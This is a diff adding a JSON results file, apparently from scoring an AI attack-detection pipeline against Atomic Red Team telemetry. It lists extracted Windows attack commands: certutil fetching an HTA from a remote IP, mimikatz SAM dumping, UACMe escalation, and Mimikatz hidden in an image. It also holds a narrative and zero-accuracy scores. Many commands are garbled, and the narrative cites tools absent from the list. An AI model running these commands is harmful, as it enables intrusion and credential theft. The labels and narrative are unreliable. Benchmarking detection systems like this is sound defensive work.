@@ -1,0 +1,214 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\AppData\\Local\\Temporary\\Internet\\Files\\Content.Outlook\\Test[1].hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c start C:\\ WINDOWS\\System32\\cmd.exe /C \"timeout /t 3 >nul&&echo TestSVC > \\.\\\\",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c \"%temp%\\uacme\\23 Akagi64.exe\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c start C:\\ WINDOWS\\System32\\cmd.exe /C \"timeout /t 3 >nul&&echo TestSVC > \\.\\\\",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\ USERS\\ADMINI~1\\AppData\\Local\\Temp\\4jc3hbus\\4jc3hbus.dll",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\ Users\\ADMINISTRATOR\\AppData\\Local\\Temp\\4jc3hbus\\4jc3hbus.dll",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c C:\\ AtomicRedTeam\\atomics\\T1220\\bin\\msxsl.exe C:\\ AtomicRedTeam\\atomics\\T1220\\src\\msxslxmlfile.xml C:\\ AtomicRedTeam\\atomics\\T1220\\src\\msxslscript.xsl",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c del /f /q Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=``2020-10-10 12:12:12``_",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\ USERS\\ADMINI~1\\AppData\\Local\\Temp\\BTGU5RM3\\BTGU5RM3.dll",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\ USERS\\ADMINI~1\\AppData\\Local\\Temp\\WXRM2DFN\\WXRM2DFN.dll",
+        "stage": "Discovery"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "power shell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke- PSImage . ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz . ps1 -Out .\\ evil- kiwi . png -Image .\\995647 . jpg\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "netsh interface portproxy add v4t ov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Start- Process $ env: TEMP\\T1059.003 _ script . bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ConvertFrom-StringData \"@{\\\"(default)\\\"=`",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\ windows\\system32\\cmd.exe /c Notepad . exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\windows\\system32\\cmd.exe /C \"echo `\"Hello from the Windows Command Prompt!\\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ USERS\\ADMINI~1\\AppData\\Local\\Temp\\MJ4JJ4LK\\ MJ4JJ4LK . dll",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c for / l % x in (1,1,75) do start word pad . exe / p C :\\ Users\\ ADMINI ~ 1 \\ AppData \\ Local \\ Temp \\ T1059 _ 003 note . txt\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ USERS\\ADMINI~1\\AppData\\Local\\Temp\\NM3KRTAP\\ NM3KRTAP . dll",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\ WINDOWS\\ System32\\cmd . exe / c \"for / l % x in (1,1,75) do start word pad . exe / p C :\\ Users\\ ADMINI ~ 1 \\ AppData \\ Local \\ Temp \\ T1059 _ 003 note . txt\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ WINDOWS\\System32\\cmd.exe /c \\\"C:\\ Users\\ ADMINI ~ 1 \\ AppData \\ Local \\ Temp \\ T1059 _ 003 note . txt\",\"  }, ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\ users\\ administ rator\\ Desktop\\ shell\\ T1059 .006 . py",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Set-ItemProperty \"HKCU: SOFTWARE \\ Classes \\ Folder \\ Shell \\ Open \\ Command\" -Name \",( default )\"  -Value \" C :\\ WINDOWS \\ System32 \\ sd clt . exe\"  -Force ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\ Windows \\ System32 \\ cmd . exe / c % LOCALAPP DATA : ~ 3 , 1% md / c echo Hello , from CMD !  >  hello . txt & type hello . txt\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ WINDOWS\\ System32\\cmd.exe / c % temp %\\ uacm e\\ 31 Ak agi64 . exe\" ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C cmd /c \\\"for / l % x in (1,1,75) do start word pad . exe / p C :\\ Users\\ ADMINI ~ 1 \\ AppData \\ Local \\ Temp \\ T1059 _ 003 note . txt\"\", ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ WINDOWS\\ System32\\cmd.exe /c \\\", ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-webrequest http :// 124.223.85.207:8082 / Test . hta  - Method POST - Use Basic Parsing - ContentType \"application\\/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe  - decode a .txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C import-module .\\invoke-psimage . ps1;invoke-ps image  - script .\\inv okemim ikats z . ps1  -Out .\\ evil - kiwi .png \\ 995647 .jpg\", ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\ windows\\system32\\cmd.exe / c start powershell & REM \\\\ system32\\ cleanmgr . exe / autoclean / d C :",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\\ Windows \\ System32 \\ RuntimeBro ker . exe - Embed ding",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\ Windows \\ System32 \\ sv chost . exe - k N etwork - Dien ste - p - s dnsapi",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-we brequest http :// 124.223 .85.207:8082 / Test . hta  - Meth od POST  - Us eBas icPar sing - Conte Type \"appl ication\\/ json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /C \"DEL /F / Q \\Users\\Administrator\\AppData\\Local\\Temporary Internet Files\\Content.OUTLOOK\\TEST[1].HTA\"",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attackers initiated a series of attacks starting with certificate utilization for fetching malicious scripts at remote URLs (multiple times). This marks an initial entry point for the attacker, and several subsequent attempts were made to establish persistence on the target system. As evident from various registry key manipulations and modifications, these efforts demonstrate the intention to persistently infiltrate the system. After gaining foothold, the attacker continued lateral movement by establishing connectivity to specific services like DNS API using the Svchost utility. In furtherance of their intentions, multiple instances of credential theft took place, employing Power Shell and CSC compilation tools. A thorough evaluation also reveals the use of the Empire framework to trigger privilege escalations for accessing sensitive information with elevated permissions. Detection evasion was achieved through cmd.exe-based processes aimed at obscuring command sequences. Conversely, the analysts discovered evidence pointing towards an abuse of PowerShell's Web Request feature facilitating communication between the attacking entity and potential C2 servers. Therefore, the cumulative analysis leads to categorization as Command & Control operations.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121074,
+      "completion_tokens": 8382,
+      "total_tokens": 129456,
+      "wall_clock_s": 112.496,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 41,
+      "fn": 23
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 41,
+      "fn": 23,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.16666666666666666,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121074,
+      "completion_tokens": 8382,
+      "total_tokens": 129456,
+      "wall_clock_s": 112.496,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
